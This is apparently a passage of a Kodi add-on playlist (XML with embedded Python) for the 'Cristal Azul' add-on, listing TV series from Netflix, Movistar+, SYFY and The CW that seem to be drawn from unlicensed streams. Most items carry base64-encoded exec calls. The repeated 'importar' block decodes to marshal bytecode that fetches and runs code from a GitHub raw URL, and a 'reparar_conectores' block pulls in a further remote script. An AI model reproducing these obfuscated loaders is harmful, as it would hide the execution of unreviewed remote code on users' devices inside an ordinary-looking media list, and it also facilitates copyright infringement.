        titulo = item[2].encode('utf-8').replace('á', 'a').replace('é', 'e').replace('í', 'i').replace('ó', 'o').replace('ú', 'u').replace('Á', 'A').replace('É', 'E').replace('Ó', 'O').replace('Ú', 'U').replace('ñ', 'n')
        anio = item[3]
        categoria = item[4]
        video += [(titulo, imagen, url, anio, categoria)]
    return [(' ', 'https://i.imgur.com/qvzF7Rz.jpg', ' ', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white] ('+str(numero_total)+')', ' ')] + sorted(video) + [(' ', 'https://i.imgur.com/qvzF7Rz.jpg', ' ', '[COLOR white]No hay mas resultados...', ' ')]

  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")

]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,xbmc,random,urllib2,xbmcgui,base64
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/thTfzMZ.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>

--------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightseagreen]Series [/COLOR][COLOR white]Netflix[/COLOR] </title>
<link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,xbmc,random,urllib2,xbmcgui,base64
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/jZ4HiVq.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>

---------------------------------------------------------------------------------------------------------------------

<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightseagreen]Series [/COLOR][COLOR white]Movistar+[/COLOR] </title>
<link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,xbmc,random,urllib2,xbmcgui,base64
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/uuMCYff.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>

--------------------------------------------------------------------------------------------------------------

<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightseagreen]Series [/COLOR][COLOR white]SYFY[/COLOR] </title>
<link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,xbmc,random,urllib2,xbmcgui,base64
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/cYJ070e.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>

--------------------------------------------------------------------------------------------------------------

<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightseagreen]Series [/COLOR][COLOR white]The CW[/COLOR] </title>
<link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
